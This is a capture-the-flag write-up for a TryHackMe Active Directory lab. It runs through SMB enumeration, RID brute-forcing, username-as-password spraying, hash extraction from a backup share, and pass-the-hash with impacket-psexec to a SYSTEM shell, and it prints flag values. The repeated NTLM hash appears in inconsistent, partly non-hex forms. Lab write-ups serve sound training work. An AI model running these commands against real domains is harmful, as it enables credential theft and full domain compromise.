---
title: "THM - Soupedecode 01 "
date: 2025-08-15 22:19:00 +0800
categories: [Active Directory]
tags: [Active Directory, CTF]
image:
  path: https://i.pinimg.com/originals/ff/a9/6e/ffa96ede4039820cdac1185df70b8dc7.gif
---

# CTF Writeup: SOUPEDECODE #1
Overview
This writeup documents the steps taken to complete a Capture The Flag (CTF) challenge targeting a Windows Server 2022 domain controller in the SOUPEDECODE.LOCAL domain. The objective was to gain initial access, escalate privileges, and retrieve the user.txt and root.txt flags. The process involved network scanning, enumeration, credential discovery, and privilege escalation using tools like nmap, smbclient, netexec (nxc), and impacket.

# Initial Reconnaissance
Step 1: Network Scanning with Nmap
To begin, I performed a network scan using nmap to identify open ports and services on the target machine (10.201.122.119). The command used was:
nmap -sC -sV 10.201.122.119


### Why: The -sC flag runs default scripts to gather additional information about services, and -sV performs version detection to identify software running on open ports.
Output: The scan revealed several open ports, including:
```
53/tcp (DNS)
88/tcp (Kerberos)
135/tcp (MSRPC)
139/tcp and 445/tcp (SMB)
389/tcp and 3268/tcp (LDAP)
464/tcp (kpasswd5)
593/tcp (RPC over HTTP)
636/tcp and 3269/tcp (tcpwrapped, likely LDAP over SSL)
3389/tcp (RDP, Microsoft Terminal Services)
```

## Key Information:
The host is a Windows Server 2022 domain controller (DC01.SOUPEDECODE.LOCAL).
SMB signing is enabled, and SMBv1 is disabled.
The domain name is SOUPEDECODE.LOCAL.



This indicated a Windows Active Directory environment, with SMB and LDAP as potential attack vectors.

# Step 2: SMB Share Enumeration
Next, I enumerated SMB shares using smbclient with anonymous access to identify accessible resources:
smbclient -L //10.201.122.119 -N


Why: The -L flag lists available shares, and -N attempts anonymous access (no credentials).
Output: The command revealed several shares:
```ADMIN$
backup
C$
IPC$
NETLOGON
SYSVOL
Users
```

Observation: The backup and Users shares were of interest, as they might contain sensitive data. However, anonymous access failed to list workgroup details due to SMBv1 being disabled.

To confirm share permissions, I used netexec (nxc) with the guest account:
nxc smb 10.201.122.119 -u "guests" -p "" --shares


### Why: netexec is a versatile tool for enumerating SMB shares and testing credentials. Using the guests account with an empty password tests for weak authentication.
Output: Confirmed the same shares, with IPC$ having READ permissions for the guest account.


# Step 3: User Enumeration via RID Brute-Forcing
To identify valid user accounts, I performed RID (Relative Identifier) brute-forcing using netexec:
nxc smb 10.201.122.119 -u "guests" -p "" --rid-brute


Why: RID brute-forcing enumerates user and group SIDs (Security Identifiers) by querying the SMB service, leveraging the guest account's access to the IPC$ share.
```Output: A list of users and groups, including:
Administrator (RID 500)
Guest (RID 501)
krbtgt (RID 502)
Domain groups like Domain Admins, Domain Users, etc.
Custom users like bmark0, otara1, ybob317, etc.
```

Action: I extracted the usernames into a file (users.txt) using awk:

```nxc smb 10.201.122.119 -u "guests" -p "" --rid-brute | awk '{split($6,a,"\\"); print a[2]}' > users.txt```

Result: The users.txt file contained 1091 usernames, which I used for credential brute-forcing.


# Initial Access
Step 4: Credential Brute-Forcing
Using the users.txt file as both the username and password list, I attempted to find valid credentials with netexec:
```nxc smb 10.201.122.119 -u users.txt -p users.txt --no-bruteforce --continue-on-success```


Why: The --no-bruteforce flag tests each username with its corresponding password (e.g., ybob317:ybob317), and --continue-on-success continues testing even after finding valid credentials.
Output: Several accounts were identified as valid, including:
guests:guests
ybob317:ybob317
Various group accounts (e.g., Enterprise:Enterprise, Domain:Domain) with guest-level access.


```Key Finding: The ybob317:ybob317 credentials were valid, indicating a user with potentially higher privileges than the guest account.```


# Step 5: Accessing the Users Share
With the ybob317 credentials, I accessed the Users share using impacket-smbclient:
impacket-smbclient 10.201.122.119/ybob317:ybob317@10.201.122.119


Why: impacket-smbclient allows interaction with SMB shares to explore file structures and retrieve files.
Actions:
Listed shares and confirmed Users was accessible.
Navigated to Users\ybob317\Desktop.
Found and read user.txt:



``` cd Users
 cd ybob317
 cd Desktop
 cat user.txt```


Output: ```The user.txt flag was 28189316c25dd3c0aa342d56d44d000d62a8.```


# Privilege Escalation
Step 6: Exploring the Backup Share
I noticed a backup share during earlier enumeration. Using the ybob317 credentials, I checked its contents but assumed it contained sensitive data (e.g., password dumps). The backup_extract.txt file was referenced in the file listing:
ls
backup_extract.txt


Action: I extracted NTLM hashes and usernames from backup_extract.txt:

```cat backup_extract.txt | awk -F\: '{ print $4}' > hashes.txt
cat backup_extract.txt | awk -F\: '{ print $1}' > users_hashes.txt```


Why: The backup_extract.txt file contained NTLM hashes in the format username:RID:LMhash:NThash:::, which could be used for pass-the-hash attacks.
Output:
users_hashes.txt: Contained usernames like WebServer$, DatabaseServer$, FileServer$, etc.
hashes.txt: Contained NTLM hashes, e.g., e41da7e79a4c76dbd9cf7sssd1cb325559 for FileServer$.




# Step 7: Pass-the-Hash Attack
Using the extracted hashes, I attempted a pass-the-hash attack with netexec:
nxc smb 10.201.122.119 -u users_hashes.txt -H hashes.txt --no-bruteforce


Why: Pass-the-hash uses NTLM hashes to authenticate without knowing the plaintext password.
Output: The FileServer$:e41da7e79a4c7sdbd9cf79d1cb325559 combination was successful, marked as (Pwn3d!), indicating administrative access.


Step 8: Gaining System Access
With the FileServer$ hash, I used impacket-psexec to gain a SYSTEM-level shell:
```impacket-psexec -hashes ":e41da7e79a4c76sbd9cf79d1cb325559" SOUPEDECODE.LOCAL/'Fileserver$'@10.201.122.119```


Why: psexec exploits administrative SMB access to execute commands as SYSTEM. The empty LM hash (:) was used since only the NT hash was available.
Initial Issue: The first attempt failed due to incorrect hash formatting:

impacket-psexec -hashes "e41da7e79a4c76dbd9df79d1cb325559" SOUPEDECODE.LOCAL/'Fileserver$'@10.201.122.119


Error: ValueError: not enough values to unpack (expected 2, got 1) indicated that psexec expected LMhash:NThash.
Fix: I reformatted the hash as :e41da7e79a4476dbd9cf79d1cb325559, which succeeded.
Output: A SYSTEM shell was obtained:

whoami/all
nt authority\system


# Step 9: Retrieving the Root Flag
In the SYSTEM shell, I navigated to the Administrator’s Desktop and retrieved the root.txt flag:
```cd C:\Users\Administrator\Desktop
type root.txt```


Output: The root.txt flag was 27cb2be3027388d63d77c86bfdd5f56a.


# Summary

User Flag: Obtained by accessing the Users\ybob317\Desktop directory with the ybob317:ybob317 credentials.
Root Flag: Obtained by performing a pass-the-hash attack with the FileServer$ account’s NTLM hash, gaining a SYSTEM shell, and reading root.txt from the Administrator’s Desktop.
Key Techniques:
Network scanning with nmap to identify services.
SMB share enumeration with smbclient and netexec.
RID brute-forcing to enumerate users.
Credential brute-forcing to find valid credentials.
Pass-the-hash with impacket-psexec for privilege escalation.



### This CTF demonstrated the importance of thorough enumeration, exploiting weak credentials, and leveraging misconfigured backup files to achieve domain compromise.